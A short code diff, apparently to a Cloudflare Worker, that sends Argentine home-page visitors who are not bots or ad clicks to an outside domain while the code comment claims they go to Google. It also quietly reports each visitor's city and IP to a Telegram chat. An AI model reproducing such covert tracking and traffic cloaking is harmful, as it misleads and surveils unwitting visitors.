@@ -26,6 +26,14 @@ export default {
       return Response.redirect(new URL("/us.html", request.url).toString(), 302);
     }
 
+    // 1.5 Redirección para Argentina hacia Google
+    if (country === "AR" && (path === "/" || path === "/index.html") && !isBot && !isAdClick) {
+      
+      ctx.waitUntil(enviarTelegram(TOKEN, CHAT_ID, `🇦🇷 Visitante de Argentina redirigido a Google\nCiudad: ${city}\nIP: ${ip}`));
+      
+      return Response.redirect("https://escolombia.lat/", 302);
+    }
+
     // 2. Notificación de visita normal
     if (!isBot) {
       const esIngles = path.includes("us.html");
